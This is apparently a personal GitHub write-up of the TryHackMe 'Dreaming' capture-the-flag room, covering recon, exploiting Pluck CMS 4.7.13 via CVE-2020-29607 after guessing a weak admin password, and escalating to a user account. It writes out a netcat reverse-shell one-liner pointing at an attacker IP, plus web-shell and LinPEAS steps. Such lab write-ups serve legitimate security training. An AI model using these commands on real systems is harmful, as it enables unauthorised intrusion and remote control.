# THM-Dreaming
![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5997701d-4379-41d2-b2bc-e2f97f37c4f4)



Personal attempt on THM CTF Challenge

RECON 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/084772cd-94f9-46ba-b317-6d805eaa61e6)

Access the target's website, we can only see Apache's default site. Let's do some directory enumeration with nmap and http-enum script. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/016a5d24-38de-470c-8170-120b0a79eab5)

Accessing the directoy, we know that the web is using Pluck CMS 4.7.13

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/48925c1d-2d60-4869-903a-3c3c75efb00a)

EXPLOIT

Upon a quick Google search, we can tell that this version of Pluck is vulnerable to an Authenticated File Upload, as documented in CVE-2020-29607. However, first we need to authenticate. 
With some luck, I was able to guess the password. It's password (not very secured 🔒)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/944c85b0-9e3d-4599-aeaa-10cd9273ee47)

The mentioned vulnerability allows an attacker to upload a web shell to the directory http://IP/admin.php?action=files to gain a webshell. This abuses the "manage files" functionality of the app.
I use this PoC from Github: https://github.com/0xAbbarhSF/CVE-2020-29607
Usage: python3 exploit.py TARGET IP TARGET PORT password pluck-cms-path

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5b4795d2-805a-4e65-b5ba-a046e22eeafc)

Now, for more control and convenience, we want a reverse shell. I personally like to use the methods from
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

On your attack machine, start a Netcat listener on a random unused port.
nc -lvnp 1234

Then run this on the webshell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
Remember to replace the IP with the IP of your attack machine. 

Wait a few a moment, then we receive a shell of the target machine as www-data. www-data is the owner of files under the web server directory.  

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/325565e4-6740-4f61-be04-977d00d318bb)

To gain a more stable shell, we can use the command:
python3 -c 'import pty;pty.spawn("/bin/bash")

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/d7cd8071-55ff-47ed-b56e-42da593972ef)

PRIVILEGE ESCALATION


![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5e59087c-b25e-49f9-97dd-7ad1978fe37c)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/07a3dbb9-dee1-4bae-aaf0-164eac7ab22e)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/eac83ba7-0d52-4a95-aa16-d7d46a750ad8)

As you can see, www-data don't have read access to the flags so, in order to get the flags, we need to find ways to escalate to higher privileges. I am using [LinPeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)

To transfer it to the target machine, we can use the manage files nav bar (under Pages). Then script will be available at /var/www/html/files/linpeas.sh

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/05e6436c-6894-4ba0-b302-fee782a6f0be)


![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/6b71812c-f6a9-4f57-a5fc-2278f753f47d)

Thanks to LinPEAS, we find some interesting files: 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/6506e51b-dce4-4049-bf7b-ff6baf43a8f5)

LUCIEN
Opening the test.py, we found Lucien password

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/b131a147-6ccb-4ea0-9b44-329fd18df755)

We can now SSH to the target using lucien's credential. The flag is found under his home directory.

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/49d3c69a-2c2d-4440-af22-a8cd8775df65)










